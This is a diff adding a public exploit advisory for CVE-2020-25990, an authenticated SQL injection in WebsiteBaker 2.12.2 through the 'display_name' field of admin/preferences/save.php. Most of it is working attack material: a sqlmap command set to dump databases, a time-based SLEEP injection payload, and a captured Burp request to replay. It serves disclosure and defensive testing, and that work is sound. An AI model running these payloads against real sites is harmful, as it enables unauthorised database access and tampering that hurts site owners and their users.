@@ -1,0 +1,46 @@
+# Exploit Title: WebsiteBaker 2.12.2 - 'display_name' SQL Injection (authenticated)
+# Google Dork: -
+# Date: 2020-09-20
+# Exploit Author: Roel van Beurden
+# Vendor Homepage:  https://websitebaker.org
+# Software Link: https://wiki.websitebaker.org/doku.php/en/downloads
+# Version: 2.12.2
+# Tested on: Linux Ubuntu 18.04
+# CVE: CVE-2020-25990
+
+
+1. Description:
+----------------------
+WebsiteBaker 2.12.2 allows SQL Injection via parameter 'display_name' in /websitebaker/admin/preferences/save.php.
+Exploiting this issue could allow an attacker to compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database.
+
+
+2. Proof of Concept:
+----------------------
+In Burpsuite intercept the request from /websitebaker/admin/preferences/save.php and save it like burp.req
+Then run SQLmap to extract the data from the database:
+
+sqlmap -r burp.req --risk=3 --level=5 --dbs --random-agent
+
+
+3. Example payload:
+----------------------
+display_name=Administrator" AND (SELECT 9637 FROM (SELECT(SLEEP(5)))ExGN)-- Cspz&language=EN&timezone=system_default&date_format=M d Y&time_format=g:i A&email=admin@example.com&new_password_1=&new_password_2=&current_password=&submit=Save&dd114892c1676ce3=j_5rdRnI_TarPQu7QmVVuw
+
+
+4. Burpsuite request:
+----------------------
+POST /websitebaker/admin/preferences/save.php HTTP/1.1
+Host: 127.0.0.1
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://127.0.0.1/websitebaker/admin/preferences/index.php
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 228
+Connection: close
+Cookie: wb-8123-sid=otfjsmqu8vljs9737crkcm8nec
+Upgrade-Insecure-Requests: 1
+
+display_name=Administrator&language=EN&timezone=system_default&date_format=M+d+Y&time_format=g%3Ai+A&email=admin%40example.com&new_password_1=&new_password_2=&current_password=&submit=Save&dd114892c1676ce3=j_5rdRnI_TarPQu7QmVVuw
